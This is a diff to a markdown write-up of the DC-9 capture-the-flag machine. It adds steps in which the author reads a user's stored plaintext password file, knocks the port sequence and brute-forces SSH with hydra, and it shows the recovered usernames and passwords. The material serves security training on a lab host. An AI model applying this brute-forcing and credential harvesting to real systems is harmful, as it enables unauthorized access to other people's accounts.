@@ -455,7 +455,7 @@ Let's check for the default knockd configuration file at `/etc/knockd.conf`
 
 Bingo! The port knock sequence is `7469 8475 9842`
 
-# 6. Looking for SSH login
+# 6. Looking for SSH logins
 
 Store the lists of usernames and passwords in `usernames.txt` and `passwords.txt` respectively
 
@@ -467,8 +467,7 @@ The combined use of `knock` and `hydra` found 3 functional logins to SSH
 
 ┌──(root㉿kali)-[~]
 └─# hydra -L users.txt -P passwords.txt ssh://10.0.88.33 -V -t 10
-Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
+⋮
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-12 20:14:23
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 10 tasks per 1 server, overall 10 tasks, 289 login tries (l:17/p:17), ~29 tries per task
@@ -482,4 +481,70 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-12 20:14:
 ⋮
 1 of 1 target successfully completed, 3 valid passwords found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-12 20:15:43
+```
+
+# 7. Looking for more interesting files
+
+The profile for `chandlerb` and `joeyt` didn't reveal much, but passwords list file was found in the profile of `janitor`
+
+<details>
+  <summary><code>.secrets-for-putin/passwords-found-on-post-it-notes.txt</code></summary>
+
+```console
+janitor@dc-9:~$ ls -lRa ~/
+/home/janitor/:
+total 16
+drwx------  4 janitor janitor 4096 Dec 12 22:15 .
+drwxr-xr-x 19 root    root    4096 Dec 29  2019 ..
+lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -> /dev/null
+drwx------  3 janitor janitor 4096 Dec 12 22:15 .gnupg
+drwx------  2 janitor janitor 4096 Dec 29  2019 .secrets-for-putin
+
+/home/janitor/.gnupg:
+total 12
+drwx------ 3 janitor janitor 4096 Dec 12 22:15 .
+drwx------ 4 janitor janitor 4096 Dec 12 22:15 ..
+drwx------ 2 janitor janitor 4096 Dec 12 22:15 private-keys-v1.d
+
+/home/janitor/.gnupg/private-keys-v1.d:
+total 8
+drwx------ 2 janitor janitor 4096 Dec 12 22:15 .
+drwx------ 3 janitor janitor 4096 Dec 12 22:15 ..
+
+/home/janitor/.secrets-for-putin:
+total 12
+drwx------ 2 janitor janitor 4096 Dec 29  2019 .
+drwx------ 4 janitor janitor 4096 Dec 12 22:15 ..
+-rwx------ 1 janitor janitor   66 Dec 29  2019 passwords-found-on-post-it-notes.txt
+janitor@dc-9:~$ cat .secrets-for-putin/passwords-found-on-post-it-notes.txt
+BamBam01
+Passw0rd
+smellycats
+P0Lic#10-4
+B4-Tru3-001
+4uGU5T-NiGHts
+```
+
+</details>
+
+# 8. Looking for (more) SSH logins
+
+```console
+┌──(root㉿kali)-[~]
+└─# knock 10.0.88.33 7469 8475 9842
+
+┌──(root㉿kali)-[~]
+└─# hydra -L users.txt -P passwords2.txt ssh://10.0.88.33 -V -t 10
+⋮
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-12 21:09:07
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 10 tasks per 1 server, overall 10 tasks, 102 login tries (l:17/p:6), ~11 tries per task
+[DATA] attacking ssh://10.0.88.33:22/
+⋮
+[22][ssh] host: 10.0.88.33   login: fredf   password: B4-Tru3-001
+⋮
+[22][ssh] host: 10.0.88.33   login: joeyt   password: Passw0rd
+⋮
+1 of 1 target successfully completed, 2 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-12 21:09:39
 ```
